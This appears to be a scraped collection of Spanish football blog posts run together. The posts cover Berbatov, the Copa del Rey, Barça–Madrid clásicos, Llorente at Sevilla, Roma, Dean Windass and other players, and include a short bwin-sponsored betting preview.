un rival de campanillas enfrente y un partido caliente y eléctrico, de esos que condicionan horarios a ciudadanos de muchos países. Quizá, con Rooney disminuido a base de rumores y maledicencias, el ManU más a rebufo del Chelsea que nunca y la posibilidad de una derrota ante el rival más odiado por su afición, el búlgaro sintió que por fin había llegado su momento, el de erigirse, en un día grande como el Redentor. O puede que no, que saliera del vestuario con la misma indolencia de siempre, cual un dandy pendiente de decidir si regalarnos su arte, y la suerte se le pusiera de cara a la vez que la musa del fútbol apoyaba la mano en su hombro. Como quiera que sea, el hatrick con el que demolió al Liverpool –gol acrobático incluido- lo ha vuelto a situar en las portadas de todos los rotativos, después de un mes en el que, poco a poco, iba avisando de que seguía ahí. Por si nos habíamos olvidado.Si dividimos a los futbolistas entre hechos a sí mismos y tocados por el don, está muy claro que Dimitar Berbatov pertenece a la segunda categoría. Pocos rematadores a nivel mundial  poseen la pureza de su toque, la precisión suprema de los que han nacido con ese plus de coordinación que separa a los simplemente buenos de los destinados, desde jóvenes, a la élite; pocos han proporcionado tantos lances sobrecargados de belleza. Desde el principio de su carrera, cuando fue secuestrado por un gángster para obligarle a cambiar de club, Berba sabe que es un futbolista especial. Ya era señalado como gran promesa durante su etapa en Leverkusen –en la que sin embargo tardó en consolidarse como titular-, y emigrado a la Premier League siguiendo los pasos de su admirado Shearer, firmó dos años en el Tottenham donde confirmó punto por punto las expectativas depositadas en él desde tan joven. Con 27 años y en el cénit de su carrera, llegaba el momento de saltar al Gotha del fútbol europeo, poniendo rumbo a Manchester previo pago de más de 50 millones de euros.Sin embargo, pronto se vio que Berbatov no parecía estar preparado, sobre todo mentalmente, para el brutal nivel de exigencia que impone un club como el United. En un entorno donde la victoria no es un festejo, sino una obligación, no basta con dejar un detallazo por partido, o un gol de bandera cada cuatro; ahí se exige rendimiento continuado y mucho sacrificio, y en caso de faltar una de las dos cosas se dibuja sobre el futbolista un blanco perfecto para las críticas. Berbatov, con su juego frío y su carácter distante, no supo hacerse un hueco junto a estrellas tan estajanovistas como Rooney o Cristiano Ronaldo, y a pesar de firmar golazos marca de la casa –como el que le hizo al Blackburn- y un puñado de buenos partidos, la prestación del búlgaro resultó muy inferior a la esperada. Cada vez más irrelevante, los rumores de traspaso crecieron el verano pasado. Parecía otro más de esos finos estilistas a los que les faltaba la sangre necesaria para triunfar.Sin embargo, a sir Alex Ferguson le molesta especialmente que sus apuestas fracasen, y siempre se ha mostrado como uno de los mayores valedores de Berbatov. Cerrada la posibilidad de una eventual salida, el escocés ha dado a su pupilo una tercera oportunidad –quizá la última- y parece ser que, por fin, el hombre de hielo está respondiendo. Será muy interesante ver si el partido del sábado marca el punto de inflexión y Dimitar asume el liderazgo ofensivo que debería corresponderle por condiciones naturales o, en cambio, queda como el canto del cisne de un ariete del que se hablará en el futuro con un “lo que podría haber sido…” El tiempo lo dirá. Algo se mueve en la Copa. Parece que los primeras han decidido tomarse el serio el torneo, y han puesto sobre los céspedes de la piel de toro, en su mayor parte, escuadras bastante parecidas a las que se juegan las habichuelas cotidianas de la Liga. La consecuencia positiva es que el torneo huela menos a Cenicienta, aunque quizá echaremos de menos las dosis de épica proporcionadas en los últimos años por tantos equipos modestos. Así han cerrado su eliminatoria el Atlético en Las Palmas (0-5), Sevilla en Irún (0-4) o Valencia en Logroño (0-3), con dobletes respectivos del Kun, Negredo y Aritz Aduriz. El partido más copero se ha vivido en Chapín sobre un terrible césped (2-3, con buenos detalles de los dinosaurios José Mari y Bermejo), y en condiciones normales, de entre los enfrentamientos desequilibrados, sólo un tocado Racing debe tener problemas en la vuelta, ya que ha caído en el nuevo Arcángel por 2-0.El único tercera superviviente, el Portugalete, ha sacado un meritorio empate a uno frente al Getafe. Una primera jornada quizá menos intensa que las de otras ocasiones, pero que quizá muestra una nueva actitud frente a la Copa. En cualquier caso, muchos seguimos prefiriendo el partido único. El Clásico número 14 de Guardiola, décimo de Mourinho desde que está en el Real Madrid, se presenta como el más descafeinado de los que han disputado hasta el momento estos dos monstruos de los banquillos. Por una parte, y salvo un milagro madridista que casi nadie espera, es muy difícil suponer que el equipo blanco protagonice la gran hombrada en el Camp Nou y tumbe a un rival al que lleva casi cuatro años sin ganar por al menos dos goles de diferencia. Por otra, y muy afortunadamente, la tensión ambiental ha descendido de forma significativa desde el dedazo de Mou, siempre que excluyamos la bestialidad aislada de Pepe que –como lo oyen- va a quedar sin castigo. Y además, el vencedor sólo se llevará como premio, además de la satisfacción de imponerse al otro, el pase a semifinales de un torneo cuya importancia es relativa. Nada decisivo, sobre todo teniendo en cuenta que no es difícil un trayecto hasta la Copa que incluya equipos del calibre del Valencia o el Athletic de Bilbao.Así las cosas, resulta llamativo comprobar cómo se aceleran los tiempos en el fútbol moderno. Hace escasamente dos semanas, el Barça sufría lo indecible para sacar un empate de Cornellá, en un partido que el Español le llenó de minas hasta lo indecible, y un nubarrón sobrevolaba la parte alta de la Diagonal cuando Roque Santa Cruz fulminaba a Valdés de preciso disparo, y empataba momentáneamente un choque hasta ese momento parejo. Hoy, tras la visita de rigor a la casa de reposo de Concha Espina, y la enésima exhibición de Messi a domicilio –no de esta temporada, precisemos- los chicos de Guardiola vuelven a lucir la sonrisa del ganador, se ven optimistas en la Liga, y es difícil que conciban la vuelta de la Copa como una noche desagradable. Pocos dudan de que Pep sacará un once muy parecido al que venció en Madrid, y la consigna general vuelve a ser “que se preocupen ellos”. Perspectivas tranquilas y halagüeñas, no sin motivo.Cada semana, y de la mano de bwin, os ofreceremos los partidos más interesantes del fútbol mundial, con especial atención a todos aquellos que os manejáis en el mundo de las apuestas on-line. Al otro lado del Ebro hay un polvorín, en parte artificial. Por una parte, la derrota ante el Barça, el pisotón de Pepe y las estupideces de Mourinho a propósito de éste, secundadas por Butragueño y Zidane, problemas todos ellos achacables en todo o en parte a miembros del organigrama del Madrid; y por otra, el desmesurado revuelo mediático causado por una típica bronca tras derrota, la relevancia otorgada a unos pitos a los Ultra Sur y, en general, la enemiga que se ha ganado o no Mou entre la propia prensa de la capital y que se ha desplegado a placer estos días, han vuelto de nuevo el ambiente irrespirable. Una situación muy propia del conjunto blanco y su entorno de los últimos años, que puede atisbar el fin el mundo incluso batiendo récords en Liga y Champions como líder destacado. Tras conocer que nadie impide al Madrid jugar sin medios matraca –veáse el partido contra el Athletic-, será muy interesante saber si el técnico portugués se atreverá a sacar en el Camp Nou una alineación como la de ayer. No tiene mucho que perder si lo hace, pues una victoria sería gloriosa, y una derrota un momento ideal para pasar cuentas a sus críticos. Sólo un escenario podría hacerle arder, y su drama es que no es imposible, quizá ni improbable: la goleada. Nadie sabe qué podría salir de otro 5-0 o similar, una sombra que atenaza a Mourinho desde hace meses. Pero quizá éste sea el momento, con la eliminatoria prácticamente perdida, de arriesgar. O no.Partido muy interesante para lanzarse a realizar apuestas, porque se puede dar lugar a varios escenarios muy diferentes. El resultado de los dos últimos clásicos del Camp Nou, empate, se paga en bwin a 4,40, y la victoria blanca a 4,75. Si asumimos que el Madrid se lance arriba y plantee por fin un partido abierto, que se marquen al menos cuatro goles se paga a 2,45, y que sean al menos cinco sube a 4,33. Un doblete de Messi, nada descartable contra su portero favorito, nos da 4,50 por cada euro, mientras que un simple gol de Alexis, en gran forma, proporciona una cuota de 3,00. Finalmente, tanto en un escenario de dejadez como en otro de intensidad se hace posible pensar en un gol postrero del Madrid, que se paga a 4,10. Merece la pena darse una vuelta. Mejor segundo delantero Liga BBVA 2011/12View ResultsLeo Messi. Aparece en la categoría de segundo delantero como podría aparecer en cualquier otra que tenga que ver con el ataque, porque ha llegado hasta el corazón del área pequeña como el mejor killer y, números en mano, es el mejor asistente de la Liga (empatado con Özil). Principio y final de la última versión del Barça de Guardiola, que ha dependido de él en proporciones casi alarmantes. Su presencia es la mejor garantía en la transición que deberá afrontar el Barça en los próximos meses. Y sus cincuenta goles quedan para siempre.Cristiano Ronaldo. El martillo del campeón de Liga, de quien ya conocíamos que era un fenomenal goleador, ha trabajado esta temporada la faceta más colectiva de su juego, y su mejora en este contexto ha tenido mucho ver en el salto de calidad de su equipo este año. Para la memoria quedan, además de sus 46 goles, algunos pases de museo como el que sirvió el segundo gol de su equipo en San Mamés, mientras que los tantos en el Camp Nou o contra el Bayern alejan su leyenda negra en los partidos decisivos. El líder del Madrid.Adrian López. Quizá la mayor revelación del campeonato, ha explotado por fin tras ir dejando pistas desde su paso por el Deportivo. Futbolista diferente, imprevisible y profundamente genial, ha sembrado la temporada de quiebros con el cuerpo, toques sutiles y regates que han servido de contrapunto perfecto para la contundencia de Falcao, y han proporcionado un salto de calidad al ataque del Atlético. Como a muchos otros jugadores de su estilo, le falta un punto de continuidad, pero resulta casi risible que a día de hoy haya dudas sobre su presencia en la Eurocopa. Enorme futuro.Jonas Gonçalves. Si bien no ha acabado de confirmar la vitola de goleador impenitente que traía de Brasil, la primera temporada completa de Jonas en Valencia le ha confirmado como un delantero fino e incisivo, que entiende el juego, es veloz con el balón y capaz tanto de abrir defensas para un ariete de referencia como para asociarse tanto con él como con los medios. Vencedor de la carrera con Piatti y Aduriz por el segundo puesto del ataque che, da la impresión de que aún posee margen de mejora. Veremos con Pellegrino.Carlos Vela. Saludado como gran promesa desde el famoso sub-17 de Perú, y captado por el Arsenal poco después, Carlitos Vela llevaba ya demasiados años dando tumbos de cesión en cesión sin acabar nunca de confirmar las expectativas  generadas por su indiscutible clase. Quizá es que a sus 23 años ha visto la Real como su última oportunidad, o quizá que sencillamente ha caído de pie en Donosti, pero lo cierto es que su juego eléctrico y sus goles han acabado marcando la diferencia entre la permanencia y el infierno para un equipo demasiado irregular.El mejor jugador del mundo dispuesto a demostrar sobre el campo el amor a sus colores.Lo peor: Una estrategia demasiado conservadora que puede funcionar bien, pero que si falla, dejará una muy mal sabor de boca a los hinchas.Jugador a seguir: Sergio Romero. Hacía años que Argentina no sacaba un portero tan bueno. Sus temporadas en el AZ lo han hecho indiscutible. Es sobrio, ágil y tiene mucho futuro.Pronóstico de DDF: Las semifinales son el lugar merecido para un equipo de tantísimos quilates.Porteros:Sergio Romero (AZ Alkmaar)Mariano Andújar (Catania)Diego Pozo (Colón)Defensas:Nicolás Otamendi (Vélez Sarsfield)Martín Demichelis (Bayern Munich)Walter Samuel (Inter)Gabriel Heinze (Olympique Marseille)Nicolás Burdisso (AS Roma)Clemente Rodríguez (Estudiantes)Ariel Garcé (Colón)Centrocampistas:Jonás Gutiérrez (NewCasttle United)Javier Mascherano (Liverpool)Juan Sebastián Verón (Estudiantes)Angel Di María (Benfica)Maximiliano Rodríguez (Liverpool)Javier Pastore (Palermo)Mario Bolatti (Florentina)Delanteros:Lionel Messi (FC Barcelona)Gonzalo Higuaín (Real Madrid)Carlos Tevez (Manchester City)Sergio Agüero (Atlético Madrid)Diego Milito (Inter)Martín Palermo (Boca Juniors) Hay dos tipos de delanteros: los inasumibles y los que podemos pagar. Entre los primeros están Luis Suárez, Agüero, Ibrahimovic, Ronaldo, Romario, Raúl, Henry, van Nistelrooy o Del Piero. Entre los segundos están todos los demás. Existen dos diferencias fundamentales entre los inasumibles y los que podemos pagar. Los primeros marcan prácticamente siempre, dónde y cómo sea, juegue el equipo a lo que juegue, ellos siempre estarán ahí para hacer su gol. Los segundos dependen del equipo, de sus miserias y virtudes, de los pases de sus compañeros y su generosa precisión en el pateo. Los primeros juegan para sí mismos, los segundos juegan con los demás. Y como ya dice el refrán: más vale sólo que mal acompañado.Ayer el Sevilla fue arrollado por el Manchester City.Sterling, Touré y Bony se bastaron para doblegar a un equipo que no termina de encontrar el camino. El músculo del centro del campo que puso Emery sobre el césped parecía de plastilina frente a las acometidas del equipo inglés. Los diez primeros minutos fueron una pesa inaguantable para un club que ve como sus opciones de continuar en la Champions se disipan. El público del Pizjuan señaló a Llorente cuando fue sustituido por Immobile. La lesión de Gameiro había puesto al exjuventino en la punta del ataque en el partido más importante de la temporada y el delantero, como el resto del equipo, no estuvo a la altura.No está siendo un buen comienzo de sesión para Fernando Llorente. Ayer, viendo el partido, tuve la sensación de que su estilo era otro. Que jugaba a otro ritmo, que buscaba los huecos que sólo él veía. Como si Emery quisiera encajar una pieza de Tente en una nave de Lego. Todo el equipo estuvo ausente, desde el portero a los delanteros pasando por un centro del campo pacato e intrascendente. La pitada a Llorente y las posteriores ovaciones a un Ciro Immobile que, del ostracismo, salió al campo exclusivamente a correr; dejan claro que el sevillismo no casa con un tipo de jugador como el que encarna el riojano.Llorente no presiona ni persigue rivales. Su juego es otro. Exactamente el mismo que hizo ante Portugal con la Selección en el Mundial de Sudáfrica y que todo el mundo aplaudió, el mismo que le hizo fichar por la Juve como una estrella: aguanta el balón, espera que se repliegue su equipo, fija a los centrales, propicia la segunda jugada, es fundamental en el balón parado… no se le puede pedir a Llorente lo que el Sevilla le pide a Gameiro o lo que se supone que Immobile puede dar. Cuando ayer escuché los silbidos pensé en quienes habían puesto a ese jugador ahí, a los que creyeron que un jugador como él podía sustituir a Bacca, a quienes pensaron que el equipo de Nervión aprendería a jugar con un perfil así.Hay dos tipos de delanteros y Llorente es de los que necesitan un equipo detrás que lo arrope y le surta balones. Cuando entró Mariano el equipo pareció jugar a algo parecido a lo que Fernando necesita, pero a los diez minutos Immobile le sustituyó. Poco puede hacer un jugador de área si no hay balones al área, si el juego es de profundidad y al pie, si el equipo no logra la posesión del balón, si Iborra, Banega o Krychowiak no pudieron en ningún momento mantener el pulso de un partido sentenciado desde el minuto diez.El Sevilla no está en este comienzo de temporada. Es un fantasma de lo que fue el año pasado. Quedan dos partidos de Champions y en unos días se espera con ganas a un Real Madrid tan gris como su segunda camiseta. El papel de Llorente debe ser capital para darle la vuelta a la situación. Hay dos tipos de delanteros y Llorente es de los que necesita que el equipo juegue para él. Si Emery no quiere hacerlo de esa forma, tendrá que ir diciéndole a Immobile que se quite el peto, porque le va a tocar jugar a él. Murió el sueño de la Liga para el Madrid. Es lo que tienen los torneos de la regularidad, que suelen ganarlos los mejores. Pero mañana empieza otra película, nada de persecuciones imposibles como la que acabó este fin de semana.Se ha ganado una nueva oportunidad en Londres.Miku. Tras acabar muy bien la temporada pasada, el espigado ariete venezolano enlazó con un comienzo estupendo en ésta: cuatro goles en tres partidos, dos de ellos en el Bernabéu. Titular indiscutible para Luis García Plaza, por delante de Güiza, resultó clave en la primera vuelta del equipo. Tras un bajón de rendimiento, repuntó en la fase final del curso, precisamente cuando más lo necesitaban los azulones. Poseedor de un duro disparo y una coordinación poco usual en un futbolista de 1.86, no desentonaría en un equipo de más nivel. Debe controlar su temperamento. Llegó la hora de la verdad para el Celta, que se juega el ascenso en dos partidos a cara o cruz ante el Granada, y del cual depende que el fútbol gallego continúe con una presencia ininterrumpida en Primera que ha durado muchos años. Aunque el último ascenso celtiña data del año 2005, el estilo del equipo que ha entrenado Paco Herrera remite mucho más a aquél que subió en 1992, y que inauguró la época más gloriosa de la historia del club. Y es que los enormes momentos brindados por gente como Víctor Fernández, Mostovoi o Makelele, la presencia en Champions o la final de Copa no hubieran sido posibles sin aquel equipo potente y directo que se proclamó campeón de Segunda. Una escuadra que comandó Chechu Rojo, con el tanque Vlado Gudelj de ariete, Paco Villanueva como cerrojo en la portería, Aguirrechu y Otero –que luego llegaría a la internacionalidad- atrás, y la clase de Fabiano moviendo a sus compañeros. Qué mejor manera de rendirle homenaje que a través de este vídeo, y de paso calentar motores para la eliminatoria que se avecina. Ojo a la banda sonora. Ya tenemos Balón de Oro, el que todo el mundo esperaba y en el que casi todo el mundo está de acuerdo. Leo Messi levanta por tercera vez el galardón que lo acredita como el mejor futbolista del año, y es difícil encontrar a alguien que se juegue un solo euro a que sea el último que consiga. El gran futbolista de nuestra era culmina de este modo un año fantástico tanto en lo personal como en lo colectivo, en el que ha logrado todos los títulos posibles excepto la Copa del Rey, y en la que ha confirmado cómo año a año es mejor jugador: conserva el regate de los mejores extremos, sigue acreditando unas cifras goleadoras que firmaría el más letal delos arietes, y recientemente ha añadido una frecuencia en el pase definitivo que le empareja con cualquier mediapunta de alto nivel. Casi la mitad de los votos globales han ido para él, la quinta parte para Cristiano, y la décima para Xavi Hernández. Y tiene 24 años. Parece extraño, uno asocia siempre la zona báltica a deportes relacionados con el frío, Lituania en particular al baloncesto, y el béisbol especialmente a América. Sin embargo, el club más laureado en la joven liga del país que la selección española visita esta noche (22:00, TVE 1), el FBK Kaunas, debe sus siglas precisamente a que combinó en diferentes secciones fútbol y béisbol: Futbolo Beisbolo Klubas Kaunas. De hecho en su escudo aparece un círculo dividido en dos mitades, una mostrando medio balón de fútbol, y otra el reglamentario bate. En la actualidad, las dos secciones están separadas, pero la antigua dicotomía prevalece en los símbolos del club.El FBK es un equipo con historia curiosa. Fundado en la época soviética con el nombre de Bangas Kaunas y representativo de la segunda ciudad del país, experimentó una reestructuración completa tras la disgregación de la URSS y la consiguiente independencia, pasando a llamarse Zalgiris. A pesar de que este sonoro nombre significa “Bosque Verde” y conmemora una gloriosa batalla del siglo XV en la que una confederación polaco-lituana venció a los caballeros de la orden teutónica, lo que lo ha hecho famoso a nivel mundial es denominar también al glorioso equipo de basket de donde salió Sabonis y  que ha sido, probablemente, la mejor imagen del país báltico a nivel internacional. Sin embargo, a pesar de compartir nombre, las dos escuadras siguieron siempre caminos bastante independientes –de hecho, el Zalgiris de fútbol cambió a su nombre actual poco después- y en la actualidad sólo las une que son propiedad del banquero Vladimir Románov(foto), también accionista mayoritario del Hearts of Midlothian escocés. De hecho, el banquero ha utilizado al FBK para enviar a Escocia nombres prometedores en su momento como Jankauskas o Velicka, y un enfrentamiento suyo con la Federación ha acabado hundiendo al equipo en el pozo de la segunda, donde pena en la actualidad.Quién sabe, quizá les hubiera ido mejor con el béisbol. Debutaba España en el Mundial de México 86, y lo hacía frente a una muy competente selección brasileña que recogía el testigo del maravilloso equipo de cuatro años antes. El partido transcurría parejo, cuando Míchel enganchó una estupenda volea en la frontal del área que sobrevoló al arquero Carlos, rebotó violentamente en el travesaño y botó tras la línea para, en extraño movimiento, acabar saliendo fuera del marco. El árbitro australiano Bambridge negó la validez del tanto, y el partido se acabó perdiendo por la mínima. Al final el error no tuvo gran influencia en el devenir mundialista de la selección de Muñoz, pero sí privó a la hinchada de disfrutar una victoria contra Brasil en un Mundial –algo que no ocurre desde el 34-. Al final, ambas escuadras cayeron en cuartos, perdedoras de la lotería de los penaltis. Si diversos motivos no hubieran distraído u ocupado más de la cuenta a los redactores de DDF, y en particular al arriba firmante, este modesto survey sobre cómo encara el Madrid la temporada hubiera resultado poco menos que el canto al optimismo; una descripción de la situación ideal en la que se encuentran los equipos campeones con margen de crecimiento. Porque no era otra la coyuntura que mostraba el Madrid a finales del mes del agosto.Ahora parece que ha transcurrido un siglo, pero a finales de junio el Madrid había clausurado la Liga con los famosos récords de 100 puntos y 121 goles, unos números excepcionales incluso teniendo en cuenta el descenso general de nivel en el campeonato español en los últimos años. A base de perforar redes y trazar jugadas a ritmo supersónico, el equipo blanco había logrado entrecomillar la fama amarrategui que gasta su entrenador, y si siempre es precipitado y probablemente falso hablar de cambio de ciclo cuando en el contrincante juega un tal Messi, el puñetazo en Camp Nou había servido como altavoz de que por fin, tras años de dictadura blaugrana, las fuerzas se igualaban. Una temporada a la que sólo una tanda de penaltis separó de ser casi perfecta, aunque justo es decir también que el Madrid fue inferior al Bayern en la famosa eliminatoria.El buen rendimiento deportivo generó igualmente calma mediática e institucional. Tras la lamentable imagen dada por el Madrid y especialmente su cuerpo técnico en Villarreal, la decisión de Mourinho de no hablar con la Prensa y el hecho de que el equipo recondujera su trayectoria calmaron un ambiente que por momentos se había tornado irrespirable. A partir de ese momento, con cualquier viso de oposición interna silenciado por los buenos resultados y el nivel de ruido disminuido a niveles mucho más razonables, el equipo blanco completó un final de temporada que permitía predecir un verano tranquilo y constructivo, y una temporada siguiente para edificar sobre la anterior. La renovación de Mourinho acentuaba esas sensaciones positivas, y los fichajes de Modric y Essien reforzaban el equipo con dos perfiles diferentes en un centro del campo considerado unánimemente como la línea más débil del equipo. La expectativa era perfecta para un equipo que además cuyo rival iba ser el  Barcelona sin Guardiola. Parecería el momento de recuperar la hegemonía perdida.Hasta aquí aproximadamente hubiera durado este post si se hubiera escrito antes de comenzar la temporada. Sin embargo, las relaciones causales y la lógica habitual sólo funcionan puntualmente en el fútbol, y si bien a largo plazo se puede vislumbrar en ocasiones la global picture, pocos fenómenos están sujetos a cambios tan drásticos en el plazo más breve. Ni el más descabellado de los análisis podía predecir el catastrófico inicio de campeonato del Real, con un punto de nueve posibles en Liga, ofreciendo además una imagen equidistante entre la desidia y el caos. Aunque la situación de los merengues parece haberse reconducido tras el cardiaco partido del City y la victoria más calmada de Vallecas, siguen flotando en el ambiente los recuerdos de aquellos equipos del cambio de siglo, los que se volcaban en la Champions tras quedar ahítos con un campeonato de Liga. Los buenos partidos contra Barcelona y City, dos de los mejores equipos de Europa, refuerzan esa hipótesis, cuya veracidad es imposible de comprobar.Sin embargo, más allá de la motivación y de que al Madrid le esté costando más de la cuenta poner en marcha la maquinaria, hay jugadores que han comenzado la temporada muy por debajo de su nivel. A Özil y Benzema, la reserva técnica del equipo en ataque, les está costando más de lo habitual empezar la temporada, y ya han probado banquillo.Hierático en la banqueta, rostro impenetrable. Pero el míster del City no necesita alquitrán en los labios ni una copa en la mano para espetar unos cuantos chistes camuflados de profundidad. “Hasta el gol el equipo jugó bien” podría ser el título de su cassette. “Lo más importante es luchar por la posesión“, hit en la previa, sería otro y se venderían como churros en las gasolineras.El Manchester City hace la suya en Inglaterra pero en Europa es una máquina millonaria de fabricar memes. Pellegrini no ha conseguido invertir esa tendencia y anoche contra el Barcelona fue un equipo partido y bisoño. Sin capacidad para taponar la salida de balón azulgrana y tremendamente inocente sobre las opciones de Messi cuando levanta su oficina en el centro del campo. Para entendernos, fue el negativo del Málaga. Los andaluces aplicaron lo que cualquiera debería: a Messi hay que vigilarlo también cuando vive lejos del área. Zona, solidaridad y a rezar. No hay otra.Lo contrario es firmar una sentencia de muerte, un heraldo de pases filtrados. De esto se dio cuenta el City en el segundo minuto del encuentro pero no tuvo armas ni actitud para solucionarlo. Contra un equipo tan preciso, si además tus centrales son dos tipos que se ganan la vida gracias a la potencia y no a la capacidad de corrección fulgurante, estás vendido. Llegarás tarde a cada balón, con el reloj fuera de hora en cada jugada. El segundo gol de Luis Suárez es todo esto. En él se reconoció con claridad al Barcelona y, lamentablemente, también al Manchester City.El desacierto de Messi desde los once metros y la calidad nítida de la pareja Silva-Agüero han facilitado que Pellegrini viaje a Barcelona con las maletas libres de otro fracaso europeo. Tras la descacharrante inversión que su club viene haciendo en los últimos años, la situación no podría tener menos gracia ni aunque te la contase Eugenio. En un antiguo documental de la RAI le preguntaron a Paolo Conti, portero bigotón y mítico en la Roma en los setenta, si ser de la Roma era una cuestión de fe. Él respondió con la frase que mejor define la circunstancia romanista. “La Roma es más que una fe. Es un fenómeno de autocombustión” Rudi García está dedicándose a la primera parte del proceso y parece agostar la tierra que pisa; lo último ha sido brasear al Bolonia en el Olímpico (5-0) Falta por ver como termina el proceso.Ningún otro entrenador en la historia del club había arrancado el campeonato ganando seis partidos consecutivos; se gana el derbi, Totti sigue en modo arcade tras la renovación; marcan todos los fichajes del verano… Los romanos, que tienden a contagiarse del ánimo del equipo como cualquier afición obsesiva, disfrutan de este café con portadas felices como si fuera el último. Pinta cojonudo pero saben que la autocombustión está en el ADN.El romanista amanece cada verano escuchando el mismo crepitar por las esquinas. Este año sí. Pero a pesar de todo, del carácter y la querencia, esta Roma incontenible ha sido una sorpresa para todos. El técnico francés está presentando cada semana un equipo organizado con inteligencia y fundamentalmente muy rápido en la ejecución de las acciones. Incandescente es seguramente la palabra que les define. En defensa andan más serios que ninguno (un gol en seis partidos) y en ataque son diversión pura. Diecisiete goles y nueve goleadores diferentes. De Rossi vuelve a ser el Capitán Futuro visto el momento por el que pasa Totti, gusta Strootman y Ljajic es un diablo por la izquierda… Tan caliente está el asunto que hasta golea Gervinho.Ahí anda el Nápoles, sí, pero si además resulta que la Juve se acatarra (y en defensa contra todo pronóstico), que lo del Inter está por ver y lo del Milan casi visto se entiende la tremenda expectación que está generando este equipo.El punto de cordura lo pone Rudi García recordando, con la manguera en la mano, que el único objetivo es volver a Europa e incordiar a los favoritos hasta última hora. El extranjero lleva dos minutos en Roma y ya conoce lo de la autocombustión. Mirar a los ojos de la gente es sencillo tras marcar el gol que deposita en la Premier al equipo de tu vida tras 104 años de historia mediocre. Levantas la barbilla y le gritas a todo el mundo lo cojonudo que eres. Fácil. Aguantar la mirada mientras desgranas el desastre que ha sido tu vida post-fútbol, un reguero de jornadas alcohólicas jalonadas con repetidos intentos de suicidio es harina de otro costal. Dean Windass, de los pocos futbolistas que han alcanzado la categoría de héroe aunque fuera en casa humilde, se volvió humano de golpe. Pienso en Windass y recuerdo lo que confesó en su día Kevin Keegan. Es complicado encontrar algo para reemplazar al fútbol porque realmente no existe.Cuando leí el asunto en la prensa telefoneé inmediatamente a Paul Giblin. Quería conocer la opinión de un hincha confeso del Hull. Para averiguar si todo había sido, como a mi me parecía, la revelación inesperada de un tío normal, o la culminación de un rumor que ya llevara tiempo ronroneando en la grada. Me cuenta que casi nadie en Hull conocía los problemas de Windass con la bebida, algo sorprendente teniendo en cuenta que admitió empujarse una docena de tragos al día. Quizá sus años en el Middlesbrough, uno de los clubes ingleses que más han trabajado por perpetuar la cultura de la pinta, hicieron algo por la causa.Sea como fuere el caso de Windass representa como pocos el paso del viejo fútbol al nuevo. Seguramente nadie le explicó al nueve, un tipo llano al que al que no se le cayeron los anillos por volver al andamio cuando el Hull le rechazó en edad juvenil, la manera de lidiar con el fútbol moderno. Nadie le dijo que mamarse y comer hasta reventar no era lo más aconsejable para un profesional de la pelotita.Casillas ha cometido algunos fallos groseros, Sergio Ramos desapareció de la alineación en el partido más importante por motivos que sólo conoce su entrenador, y el recién aterrizado Modric ha alternado buenos ratos con otros que recuerdan su fama de lagunero. Tampoco las estupideces de Cristiano Ronaldo delante de los micrófonos han contribuido a limpiar el ambiente, y la combinación con el pleno del nuevo Barcelona de Vilanova amenaza al Madrid con una despedida prematura de la competición liguera. En este sentido, las próximas semanas decidirán en gran medida la temporada de un Madrid que a día de hoy es una incógnita. El papel de Mourinho, más tranquilo de lo habitual en la ventisca, será más crucial que nunca. Siendo el líder, debe demostrarlo ahora. Hagamos un poco de fútbol-ficción, que es verano y sobra tiempo. Supongamos que el Villarreal hubiera vendido a Rossi al Barça por, digamos, 35 kilos. Supongamos que ficha otro delantero por 20, que normalmente será peor que el italiano (iguales o mejores entran pocos en docena). Y supongamos que el ariete no tiene hoy el día y no emboca las que ha metido Giuseppe, que especialmente la segunda no la meto yo, ni usted, ni el que está detrás de usted. 20 millones más de la Champions al limbo, y el equipo amarillo fuera de la élite europea. ¿Hubiera sido la venta un buen negocio? Mientras cada uno extrae su moraleja, bastará decir aquí que el trolebús del Odense frenó al submarino en el primer tiempo, pero tras el receso Cani y Borja dieron un paso adelante, comenzaron a enhebrar ese fútbol delicado que tanto se disfruta en el Madrigal, y acabó apareciendo Joe Red con el mazo para certificar el pleno hispano en Champions. En el prescindible epílogo, un par de expulsiones, el cante de Wessels en el tercero de Marchena, y la muerte lenta de un partido que deja a cada su equipo en su sitio natural. El choque se olvidará pronto, pero la celebración enajenada de Roig sirve como alegoría de lo que son estas eliminatorias para la clase media europea. Cara y cruz, la diferencia entre el crecimiento y la decadencia. Se despejó la incógnita: tras haber proporcionado suministro a su prensa de cabecera durante un mes, la directiva del Madrid ha elegido a Emmanuel Adebayor para cubrir durante el resto de la temporada la baja de temporal de Gonzalo Higuaín. El mejor jugador de la historia de Togo llega cedido gratis hasta junio, y el equipo blanco se hará cargo de la mitad de la astronómica ficha que le pagaba el City. Con él, el club de Chamartín adquiere un mastodonte que se mueve con un bailarín –la comparación con Kanu es pertinente-, que se siente cómodo plantando su tienda en el punto de penalty, protege el balón como un mastín a su dueño y ofrece cursos de descolgar balones y repartirlos hacia los costados. Además, de algún modo Manu responde al tipo de futbolista que le gusta a Mourinho: díscolo, poderoso, veterano y curtido, el tipo de guerrero que suele enrolar el portugués en sus jaurías. Un nueve clásico, con muchas de las virtudes de los grandes delanteros centros, y un pequeño defecto: apenas tiene gol. Fue un hito en la historia de los Madrid-Athletic, hace 52 años. El mismo día en el que se disputaba la inolvidable final del Mundial 58, en la que el fútbol coronaría a Pelé, se enfrentaban los dos clásicos del fútbol español con la Copa del Generalísimo en juego. No era cualquier Real Madrid, sino seguramente el mejor que nunca se haya visto, campeón de Europa por tercera vez poco tiempo antes frente al Milan, y con Di Stéfano y Rial, que no habían ido al Mundial, en sus filas. Enfrente, un Athletic no tan venido a menos, pero donde aún corría la banda un veterano Gaínza, Arteta lo enchufaba todo, y destacaba gente como Carmelo Cedrún, Etura o Koldo Aguirre.Todas las crónicas hablan de un partido de claro dominio vizcaíno. Ante 125.000 personas que llenaban el coliseo de Chamartín, los leones jugaron uno de esos partidos sobre los que se edifica la historia de un equipo, se adelantaron pronto con gol de Arieta, y resistieron heroicamente las embestidas del mejor equipo de la época hasta que Mauri, muriendo ya el choque, clavaba la estocada del 2-0 definitivo. La bilbainada del capitán Piru al recoger la Copa, “El año que viene volvermos, Excelencia”, quedó sepultada en las catacumbas de la Historia por la frase que pronunció un enloquecido Enrique Guzmán, presidente del Athletic desde el balcón de la Casa Consistorial, y ante una multitud enfervorizada:“¡Les hemos ganado con once aldeanos!” Lo pensamos muchos, pero nadie lo había dicho en voz alta hasta que Manolo Preciado lo dejó caer en rueda de prensa el otro día. Carlos Marchena, aparte de zaguero duro y expeditivo que ha desarrollado una carrera notable y batido el récord de partidos invicto con la selección, se ha caracterizado siempre por ser uno de esos jugadores “listos”, expertos en el otro fútbol, en confundir, fingir, simular 